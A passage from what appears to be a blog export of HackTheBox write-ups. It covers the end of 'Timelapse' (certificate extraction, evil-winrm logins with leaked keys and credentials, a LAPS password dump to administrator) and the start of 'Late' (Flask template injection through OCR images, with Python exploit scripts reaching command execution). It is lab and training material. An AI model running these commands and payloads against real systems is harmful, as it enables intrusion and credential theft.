YUX/l/Pa+I609YvF/C86/nsTC7iaj/9lCKbJogNtmq5gboBF0PUk/OzY8yZLGrUj Cj9d6XaVGYRjNJq3QVvqh/iYfa9ayFx+1yWBwiFANfmYPiILwREYJkM6Ro0AS1sQ l6wczK4Bz6UKW1HHin0pua8KtcYTQcuHlvsgIf7VHv2H5TbROs5he4FDXRA3KtoQ IiVDGcA/7I3kqxa1XMdLplxjYEp4pfbWk57NNA3fmbTpRgkDVE+tn8vKj3T0WKRa HDn2PFBUlIqnTNkkegGEc9knBjS3VEGcYIjtU78ppAR/ODABOEqcHl7/KJ63jHaq a1/F92XJYNZncu+OEKhKlk/gdCEQqJqp642rGINSSM+Or1ccsCpgkWl80kWZTrsh fF5tPBzHuEyjKChVjtjJDeorQpZtQ7BoL2G7ip4IzgYYYdwcaXbAYpQbyiaE6qGn HsM6IzAtcW0p9kjo2um+Vg== -----END ENCRYPTED PRIVATE KEY-----   Extract .crt:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt Enter Import Password: thuglegacy  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ ls -al cert.crt -rw------- 1 kali kali 1238 May  8 16:39 cert.crt  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ cat cert.crt Bag Attributes     localKeyID: 01 00 00 00 subject=CN = Legacyy  issuer=CN = Legacyy  -----BEGIN CERTIFICATE----- MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1 MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0 0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z 7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72 MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0 3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/ fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA   Decrypt private key:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ openssl rsa -in priv.key -out decrypted-priv.key Enter pass phrase for priv.key: password writing RSA key  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ ls -al decrypted-priv.key -rw------- 1 kali kali 1675 May  8 16:40 decrypted-priv.key   Port 389 &amp; Port 636 - LDAP  Enumerated LDAP using NSE:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ sudo nmap -n -sV --script \"ldap* and not brute\" 10.10.11.152 -sT ... 389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name) | ldap-rootdse: | LDAP Results |   &lt;ROOT&gt; |       domainFunctionality: 7 |       forestFunctionality: 7 |       domainControllerFunctionality: 7 |       rootDomainNamingContext: DC=timelapse,DC=htb |       ldapServiceName: timelapse.htb:dc01$@TIMELAPSE.HTB |       isGlobalCatalogReady: TRUE |       supportedSASLMechanisms: GSSAPI |       supportedSASLMechanisms: GSS-SPNEGO |       supportedSASLMechanisms: EXTERNAL |       supportedSASLMechanisms: DIGEST-MD5 |       supportedLDAPVersion: 3 |       supportedLDAPVersion: 2 |       supportedLDAPPolicies: MaxPoolThreads |       supportedLDAPPolicies: MaxPercentDirSyncRequests |       supportedLDAPPolicies: MaxDatagramRecv |       supportedLDAPPolicies: MaxReceiveBuffer |       supportedLDAPPolicies: InitRecvTimeout |       supportedLDAPPolicies: MaxConnections |       supportedLDAPPolicies: MaxConnIdleTime |       supportedLDAPPolicies: MaxPageSize |       supportedLDAPPolicies: MaxBatchReturnMessages |       supportedLDAPPolicies: MaxQueryDuration |       supportedLDAPPolicies: MaxDirSyncDuration |       supportedLDAPPolicies: MaxTempTableSize |       supportedLDAPPolicies: MaxResultSetSize |       supportedLDAPPolicies: MinResultSets |       supportedLDAPPolicies: MaxResultSetsPerConn |       supportedLDAPPolicies: MaxNotificationPerConn |       supportedLDAPPolicies: MaxValRange |       supportedLDAPPolicies: MaxValRangeTransitive |       supportedLDAPPolicies: ThreadMemoryLimit |       supportedLDAPPolicies: SystemMemoryLimitPercent |       supportedControl: 1.2.840.113556.1.4.319 |       supportedControl: 1.2.840.113556.1.4.801 |       supportedControl: 1.2.840.113556.1.4.473 |       supportedControl: 1.2.840.113556.1.4.528 |       supportedControl: 1.2.840.113556.1.4.417 |       supportedControl: 1.2.840.113556.1.4.619 |       supportedControl: 1.2.840.113556.1.4.841 |       supportedControl: 1.2.840.113556.1.4.529 |       supportedControl: 1.2.840.113556.1.4.805 |       supportedControl: 1.2.840.113556.1.4.521 |       supportedControl: 1.2.840.113556.1.4.970 |       supportedControl: 1.2.840.113556.1.4.1338 |       supportedControl: 1.2.840.113556.1.4.474 |       supportedControl: 1.2.840.113556.1.4.1339 |       supportedControl: 1.2.840.113556.1.4.1340 |       supportedControl: 1.2.840.113556.1.4.1413 |       supportedControl: 2.16.840.1.113730.3.4.9 |       supportedControl: 2.16.840.1.113730.3.4.10 |       supportedControl: 1.2.840.113556.1.4.1504 |       supportedControl: 1.2.840.113556.1.4.1852 |       supportedControl: 1.2.840.113556.1.4.802 |       supportedControl: 1.2.840.113556.1.4.1907 |       supportedControl: 1.2.840.113556.1.4.1948 |       supportedControl: 1.2.840.113556.1.4.1974 |       supportedControl: 1.2.840.113556.1.4.1341 |       supportedControl: 1.2.840.113556.1.4.2026 |       supportedControl: 1.2.840.113556.1.4.2064 |       supportedControl: 1.2.840.113556.1.4.2065 |       supportedControl: 1.2.840.113556.1.4.2066 |       supportedControl: 1.2.840.113556.1.4.2090 |       supportedControl: 1.2.840.113556.1.4.2205 |       supportedControl: 1.2.840.113556.1.4.2204 |       supportedControl: 1.2.840.113556.1.4.2206 |       supportedControl: 1.2.840.113556.1.4.2211 |       supportedControl: 1.2.840.113556.1.4.2239 |       supportedControl: 1.2.840.113556.1.4.2255 |       supportedControl: 1.2.840.113556.1.4.2256 |       supportedControl: 1.2.840.113556.1.4.2309 |       supportedControl: 1.2.840.113556.1.4.2330 |       supportedControl: 1.2.840.113556.1.4.2354 |       supportedCapabilities: 1.2.840.113556.1.4.800 |       supportedCapabilities: 1.2.840.113556.1.4.1670 |       supportedCapabilities: 1.2.840.113556.1.4.1791 |       supportedCapabilities: 1.2.840.113556.1.4.1935 |       supportedCapabilities: 1.2.840.113556.1.4.2080 |       supportedCapabilities: 1.2.840.113556.1.4.2237 |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=timelapse,DC=htb |       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb |       schemaNamingContext: CN=Schema,CN=Configuration,DC=timelapse,DC=htb |       namingContexts: DC=timelapse,DC=htb |       namingContexts: CN=Configuration,DC=timelapse,DC=htb |       namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb |       namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb |       namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb |       isSynchronized: TRUE |       highestCommittedUSN: 131175 |       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb |       dnsHostName: dc01.timelapse.htb |       defaultNamingContext: DC=timelapse,DC=htb |       currentTime: 20220509042654.0Z |_      configurationNamingContext: CN=Configuration,DC=timelapse,DC=htb   Port 88 - Kerberos  User enumeration:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=timelapse.htb, 10.10.11.152 -sT Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 17:04 EDT Nmap scan report for dc01.timelapse.htb (10.10.11.152) Host is up (0.037s latency).  PORT   STATE SERVICE 88/tcp open  kerberos-sec | krb5-enum-users: | Discovered Kerberos principals |     guest@timelapse.htb |_    administrator@timelapse.htb  Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds   Exploitation  Login using leaked keys  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ evil-winrm -c cert.crt -k priv.key -i 10.10.11.152 -u -p password -S  Evil-WinRM shell v3.3  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  Warning: SSL enabled  Info: Establishing connection to remote endpoint  Enter PEM pass phrase: *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoami; hostname Enter PEM pass phrase: timelapse\\legacyy dc01 ... *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; dir      Directory: C:\\Users\\legacyy\\Desktop  Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -ar---         5/8/2022   8:36 PM             34 user.txt  *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; cat user.txt 64233e623cda535f5a5054258fe2f9dd   Privilege Escalation  Local enumeration as legacyy  Enumerated local user and privileges:  *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; whoami /priv Enter PEM pass phrase:  PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; net user  User accounts for \\\\  ------------------------------------------------------------------------------- Administrator            babywyrm                 Guest krbtgt                   legacyy                  payl0ad sinfulz                  svc_deploy               thecybergeek TRX The command completed with one or more errors.   Enumerated Powershell history:  *Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt Enter PEM pass phrase: whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit   Login as svc_deploy using leaked credentials  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ evil-winrm -u 'timelapse.htb\\svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152 -S  Evil-WinRM shell v3.3  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  Warning: SSL enabled  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; whoami timelapse\\svc_deploy   Local enumeration as svc_deploy:  *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; whoami timelapse\\svc_deploy *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; whoami /priv  PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  *Evil-WinRM* PS C:\\Users&gt; net user  User accounts for \\\\  ------------------------------------------------------------------------------- Administrator            babywyrm                 Guest krbtgt                   legacyy                  payl0ad sinfulz                  svc_deploy               thecybergeek TRX The command completed with one or more errors.  *Evil-WinRM* PS C:\\Program Files\\LAPS\\CSE&gt; whoami /groups  GROUP INFORMATION -----------------  Group Name                                  Type             SID                                          Attributes =========================================== ================ ============================================ ================================================== Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group TIMELAPSE\\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448  *Evil-WinRM* PS C:\\Users\\svc_deploy&gt; Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime  Parent              Name                                        LastWriteTime ------              ----                                        ------------- Program Files       Common Files                                10/23/2021 11:28:43 AM Program Files       internet explorer                           3/3/2022 10:01:29 PM Program Files       LAPS                                        10/25/2021 9:01:12 AM Program Files       VMware                                      3/3/2022 10:10:19 PM Program Files       Windows Defender                            3/3/2022 10:01:29 PM Program Files       Windows Defender Advanced Threat Protection 3/21/2022 8:45:03 PM Program Files       Windows Mail                                3/3/2022 10:01:29 PM Program Files       Windows Media Player                        3/3/2022 10:01:29 PM Program Files       Windows Multimedia Platform                 9/15/2018 12:19:03 AM Program Files       windows nt                                  9/15/2018 12:28:48 AM Program Files       Windows Photo Viewer                        3/3/2022 10:01:29 PM Program Files       Windows Portable Devices                    9/15/2018 12:19:03 AM Program Files       Windows Security                            9/15/2018 12:19:00 AM Program Files       WindowsPowerShell                           9/15/2018 12:19:00 AM Program Files (x86) Common Files                                9/15/2018 12:28:48 AM Program Files (x86) Internet Explorer                           3/3/2022 10:01:29 PM Program Files (x86) Microsoft.NET                               9/15/2018 12:19:00 AM Program Files (x86) Windows Defender                            3/3/2022 10:01:29 PM Program Files (x86) Windows Mail                                3/3/2022 10:01:29 PM Program Files (x86) Windows Media Player                        3/3/2022 10:01:29 PM Program Files (x86) Windows Multimedia Platform                 9/15/2018 12:19:03 AM Program Files (x86) windows nt                                  9/15/2018 12:28:48 AM Program Files (x86) Windows Photo Viewer                        3/3/2022 10:01:29 PM Program Files (x86) Windows Portable Devices                    9/15/2018 12:19:03 AM Program Files (x86) WindowsPowerShell                           9/15/2018 12:19:00 AM  *Evil-WinRM* PS C:\\Program Files&gt; cd LAPS *Evil-WinRM* PS C:\\Program Files\\LAPS&gt; dir      Directory: C:\\Program Files\\LAPS  Mode                LastWriteTime         Length Name ----                -------------         ------ ---- d-----       10/25/2021   9:01 AM                CSE  *Evil-WinRM* PS C:\\Program Files\\LAPS&gt; cd CSE *Evil-WinRM* PS C:\\Program Files\\LAPS\\CSE&gt; ls      Directory: C:\\Program Files\\LAPS\\CSE  Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -a----         5/5/2021   7:04 AM         184232 AdmPwd.dll   Extracted credentials from LAPS (Pentesting LAPS):  *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'  Name ms-Mcs-AdmPwd ---- ------------- DC01 1n%91DMO+oB7g04BI3QuDqbl  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Timelapse] ‚îî‚îÄ$ evil-winrm -u 'Administrator' -p '1n%91DMO+oB7g04BI3QuDqbl' -i 10.10.11.152 -S Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami; hostname; ipconfig timelapse\\administrator dc01 Windows IP Configuration  Ethernet adapter Ethernet0:     Connection-specific DNS Suffix  . : htb    IPv6 Address. . . . . . . . . . . : dead:beef::244    IPv6 Address. . . . . . . . . . . : dead:beef::a1aa:6aa7:3b3e:f286    Link-local IPv6 Address . . . . . : fe80::a1aa:6aa7:3b3e:f286%13    IPv4 Address. . . . . . . . . . . : 10.10.11.152    Subnet Mask . . . . . . . . . . . : 255.255.254.0    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:8587%13                                        10.10.10.2  *Evil-WinRM* PS C:\\Users&gt; Get-Childitem -Path C:\\Users -Filter *.txt -Recurse      Directory: C:\\Users\\legacyy\\Desktop  Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -ar---        5/10/2022   9:53 AM             34 user.txt      Directory: C:\\Users\\TRX\\Desktop  Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -ar---        5/10/2022   9:53 AM             34 root.txt  *Evil-WinRM* PS C:\\Users&gt; type C:\\Users\\TRX\\Desktop\\root.txt e3bd4bdccaac9047624f5d2b0ece9955     Trophy    User.txt  64233e623cda535f5a5054258fe2f9dd  Root.txt  e3bd4bdccaac9047624f5d2b0ece9955"
  },
  
  {
    "title": "HackTheBox - Late",
    "url": "/posts/late/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2022-08-20 00:00:00 +0200",
    "content": "Resolution summary     Web site enumeration reveled a sub-domain running a Flask Optical Character Recognition tool   The application turned out to be vulnerable to SSTI and it was possible to obtain arbitrary code execution   svc_acc was able to create files inside a $PATH folder, allowing to exploit a relative path hijacking vulnerabilities in a custom script and obtain code execution as root   Improved skills     Exploit Server Side Template Injection to execute arbitrary code   Abuse Relative Path Hijacking vulnerabilities to elevate privileges   Used tools     nmap   gobuster   convert   linpeas.sh     Information Gathering  Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late] ‚îî‚îÄ$ sudo nmap -p- -sS 10.10.11.156 -oN scan/all-tcp-ports.txt [sudo] password for maoutis: Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-10 14:58 CEST Nmap scan report for 10.10.11.156 Host is up (0.038s latency). Not shown: 65533 closed ports PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http  Nmap done: 1 IP address (1 host up) scanned in 32.64 seconds   Enumerated open TCP ports:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late] ‚îî‚îÄ$ sudo nmap -p22,80 -sV -sC -A -oN scan/open-tcp-ports.txt -sT 10.10.11.156 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-10 15:00 CEST Nmap scan report for 10.10.11.156 Host is up (0.036s latency).  PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) |   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open  http    nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Late - Best online image tools Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using proto 1/icmp) HOP RTT      ADDRESS 1   34.85 ms 10.10.14.1 2   35.67 ms 10.10.11.156  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds   Enumeration  Port 80 - HTTP (nginx 1.14.0 (Ubuntu))  Enumerated domain and added them to /etc/hosts:      echo '10.10.11.156     late.htb images.late.htb' | sudo tee -a /etc/hosts   late.htb  Enumerated web directories and files:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late] ‚îî‚îÄ$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 25 ... /index.html           (Status: 200) [Size: 9461] /contact.html         (Status: 200) [Size: 6364] /.                    (Status: 301) [Size: 194] [--&gt; http://late.htb/./]  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late] ‚îî‚îÄ$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25 ... /assets               (Status: 301) [Size: 194] [--&gt; http://late.htb/assets/]   images.late.htb  Browsed the domain:    Transformed an image into text:    ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ cat results.txt                                                                                             1 ‚öô &lt;p&gt;&lt;/p&gt;   Generated an image containing some text inside:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ convert -background \"#000000\" -size 800x480 -fill \"#ffffff\" -pointsize 72 -gravity center label:'Some Text' output.png     POST /scanner HTTP/1.1 Host: images.late.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------178752961334934490701098382232 Content-Length: 4346 Origin: http://images.late.htb Connection: close Referer: http://images.late.htb/ Upgrade-Insecure-Requests: 1  -----------------------------178752961334934490701098382232 Content-Disposition: form-data; name=\"file\"; filename=\"output.png\" Content-Type: image/png  &lt;raw_img_bytes&gt;    HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 10 May 2022 13:31:14 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 17 Connection: close Content-Disposition: attachment; filename=results.txt Last-Modified: Tue, 10 May 2022 13:31:14 GMT Cache-Control: no-cache ETag: \"1652189474.292456-17-369233444\"  &lt;p&gt;Some Text &lt;/p&gt;   Exploitation  Server Side Template Injection  The application, build using Flask, used templates to generates results.txt. A sample code of the implemented logic may be similar to the following one:  from flask import Flask, render_template, request, url_for, Response import pytesseract import cv2 from PIL import Image  @app.route('/scanner', methods=['GET', 'POST']) def upload():     try:         imagefile = request.files.get('imagefile', '')          img = Image.open(imagefile)         text = pytesseract.image_to_string(img)         f = open(\"sample.txt\", \"a\")         f.truncate(0)         f.write(text)         f.close()         return render_template('result.html', var=text)     except:             return render_template('error.html')   #result.txt &lt;p&gt;&lt;/p&gt;   This thesis can be verified by passing a non destructive payload containing a Flask template and observing the behavior:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ convert -background \"#000000\" -size 800x480 -fill \"#ffffff\" -pointsize 72 -gravity center label:'\\{\\{5-2\\}\\}' output.png ...  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ cat results.txt &lt;p&gt;3 &lt;/p&gt;   Because results.txt contained the value ‚Äú3‚Äù it meant that the server executed the instruction contained inside the generated template.  An exploit was developed to simplify the exploitation process:  #!/home/maoutis/.pyenv/shims/python import requests, os from sys import argv  if len(argv) &lt; 3: \tprint(\"Usage: python3 sendImg.py &lt;url&gt; &lt;cmd&gt;\") \texit()  url \t= argv[1] cmd \t= argv[2]  ## Generating the image print(\"Generating the payload...\")  fullCmd = \"\"\"/usr/bin/convert \\ -background \"#000000\" \\ -size 800x480 \\ -fill \"#ffffff\" \\ -font \"/usr/share/fonts-firacode/woff/FiraCode-Light.woff\" \\ -pointsize 25 \\ -gravity center \\ label:'\\{\\{\"\"\"+cmd+\"\\}\\}' /tmp/exploit.png\" os.system(fullCmd)  ## Import the image f = open(\"/tmp/exploit.png\",\"rb\")  ## Multipart / File upload print(f\"Uploading file to {url}\")  files = {'file': (\"image.jpg\", f, 'image/jpg')} resp = requests.post(url, files=files)  ## Output print(\"\\n\\nServer response: \") print(html.unescape(resp.content.decode()))   Enumerated all the available classes in search of one that allows to execute remote code:  #!/home/maoutis/.pyenv/shims/python import requests, os, html from sys import argv  if len(argv) &lt; 3: \tprint(\"Usage: python3 sendImg.py &lt;url&gt; &lt;cmd&gt;\") \texit()  url \t= argv[1] cmd \t= argv[2]  ## Generating the image print(\"Generating the payload...\")  fullCmd = \"\"\"/usr/bin/convert \\ -background \"#000000\" \\ -size 2400x1080 \\ -fill \"#ffffff\" \\ -font \"/usr/share/fonts-firacode/woff/FiraCode-Light.woff\" \\ -pointsize 25 \\ -gravity center \\ label:'\\{\\{\"\"\"+cmd+\"\\}\\}' /tmp/exploit.png\" os.system(fullCmd)  ## Import the image f = open(\"/tmp/exploit.png\",\"rb\")  ## Multipart / File upload print(f\"Uploading file to {url}\")  files = {'file': (\"image.jpg\", f, 'image/jpg')} resp = requests.post(url, files=files)  ## Output print(\"\\n\\nServer response: \") #print(html.unescape(resp.content.decode()))  output = html.unescape(resp.content.decode())  i = 0 string = \"\"  for val in output: \tif val == '&lt;': \t\tprint(f\"{i} - {string}\") \t\ti+=1 \t\tstring=\"\" \telse: \t\tstring+=val   ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ python3 enum.py 'http://images.late.htb/scanner' '\"foo\".__class__.__base__.__subclasses__()' Generating the payload... Uploading file to http://images.late.htb/scanner  Server response: 0 - 1 - p&gt;[ 2 - class 'type'&gt;, 3 - class 'weakref'&gt;, 4 - class 'weakcallableproxy'&gt;, 5 - class 'weakproxy'&gt;, 6 - class 'int'&gt;, ... 251 - class 'subprocess.Popen'&gt;, ## index 249 because indexes 0 and 1 do not come from python classes ...   Executed arbitrary code using the subprocess.Popen class:  #!/home/maoutis/.pyenv/shims/python import requests, os, html from sys import argv  if len(argv) &lt; 3: \tprint(\"Usage: python3 sendImg.py &lt;url&gt; &lt;cmd&gt;\") \texit()  url \t= argv[1] cmd \t= argv[2]  ## Generating the image print(\"Generating the payload...\")  fullCmd = \"\"\"/usr/bin/convert \\ -background \"#000000\" \\ -size 1920x1080 \\ -fill \"#ffffff\" \\ -font \"/usr/share/fonts-firacode/woff/FiraCode-Light.woff\" \\ -pointsize 20 \\ -gravity center \\ label:'\\{\\{\"\"\"+cmd+\"\\}\\}' /tmp/exploit.png\" os.system(fullCmd)  ## Import the image f = open(\"/tmp/exploit.png\",\"rb\")  ## Multipart / File upload print(f\"Uploading file to {url}\")  files = {'file': (\"image.jpg\", f, 'image/jpg')} resp = requests.post(url, files=files)  ## Output print(\"\\n\\nServer response: \") print(html.unescape(resp.content.decode()))   ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Late/exploit] ‚îî‚îÄ$ python3 sendImg.py 'http://images.late.htb/scanner' '\"foo\".__class__.__base__.__subclasses__()[249](\"ls\",shell=True,stdout=-1).communicate()' Generating the payload... Uploading file to http://images.late.htb/scanner  